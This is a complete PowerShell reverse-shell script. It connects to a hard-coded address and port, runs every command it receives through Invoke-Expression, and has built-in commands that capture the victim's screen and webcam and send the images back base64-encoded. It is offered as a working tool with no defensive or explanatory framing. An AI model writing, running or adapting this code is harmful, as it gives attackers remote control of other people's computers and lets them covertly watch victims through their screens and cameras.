# --- THE LEGACY LOCK-IN: NO WINRT, NO CRASHES ---
$ip = '192.168.1.15'
$port = 4444

$c = New-Object System.Net.Sockets.TCPClient
try {
    $c.Connect($ip, $port)
    $s = $c.GetStream()
    $r = New-Object System.IO.StreamReader($s)
    $w = New-Object System.IO.StreamWriter($s)
    $w.AutoFlush = $true

    $w.WriteLine("--- LEGACY ATOMIC SHELL ACTIVE ---")

    while($c.Connected) {
        $w.Write("PS " + (Get-Location).Path + "> ")
        $line = $r.ReadLine()
        if ($null -eq $line) { break }
        $cmd = $line.Trim()

        if ($cmd -eq "exit") { break }

        # --- BRANCHING ---
        if ($cmd -eq "screenshot") {
            try {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp  = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
                $g    = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $mem  = New-Object System.IO.MemoryStream
                $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($mem.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
            } catch { $w.WriteLine("Error: $($_.Exception.Message)") }
        } 
        elseif ($cmd -eq "webcam") {
            try {
                # Use the legacy AVICAP32.dll - No WinRT involved!
                $code = @'
                [DllImport("avicap32.dll")] public static extern int capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, int hwndParent, int nID);
                [DllImport("user32.dll")] public static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);
'@
                $cap = Add-Type -MemberDefinition $code -Name "Cap" -PassThru
                $hwnd = $cap::capCreateCaptureWindowA("V", 0, 0, 0, 640, 480, 0, 0)
                
                # Connect to driver (0), Grab Frame (WM_CAP_GRAB_FRAME = 0x41e), Copy to Clipboard (0x41f)
                [void]$cap::SendMessage($hwnd, 0x40a, 0, 0) # Connect
                [void]$cap::SendMessage($hwnd, 0x41e, 0, 0) # Grab
                [void]$cap::SendMessage($hwnd, 0x41f, 0, 0) # Copy to Clipboard
                [void]$cap::SendMessage($hwnd, 0x40b, 0, 0) # Disconnect
                
                Add-Type -AssemblyName System.Windows.Forms
                $img = [System.Windows.Forms.Clipboard]::GetImage()
                $ms = New-Object System.IO.MemoryStream
                $img.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($ms.ToArray()))
                
                $ms.Dispose(); [System.Windows.Forms.Clipboard]::Clear()
            } catch { $w.WriteLine("Webcam Error: $($_.Exception.Message)") }
        } 
        else {
            try {
                $out = Invoke-Expression $cmd 2>&1 | Out-String
                $w.WriteLine(if($out){$out}else{"Done."})
            } catch { $w.WriteLine("Error: $($_.Exception.Message)") }
        }
    }
} catch {
} finally {
    if ($c) { $c.Close() }
}
